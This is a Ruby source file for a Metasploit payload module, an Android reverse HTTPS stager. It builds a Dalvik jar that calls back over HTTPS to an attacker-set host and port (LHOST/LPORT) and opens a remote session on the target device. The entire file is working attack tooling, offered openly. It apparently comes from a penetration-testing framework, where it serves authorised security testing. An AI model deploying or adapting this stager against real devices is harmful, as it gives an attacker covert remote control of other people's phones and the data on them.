##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/uuid/options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Android
  include Msf::Payload::UUID::Options

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Android Reverse HTTPS Stager',
      'Description' => 'Tunnel communication over HTTPS',
      'Author'      => ['anwarelmakrahy', 'OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Stager'      => {'Payload' => ''}
    ))
  end

  def generate_jar(opts={})
    opts[:ssl] = true
    super(opts)
  end

  def payload_uri(req=nil)
    # Default URL length is 30-256 bytes
    uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
    # Generate the short default URL if we don't know available space
    if self.available_space.nil?
      uri_req_len = 5
    end

    url = "https://#{datastore["LHOST"]}:#{datastore["LPORT"]}#{luri}"
    # TODO: perhaps wire in an existing UUID from opts?
    url << generate_uri_uuid_mode(:init_java, uri_req_len)

    url
  end


end
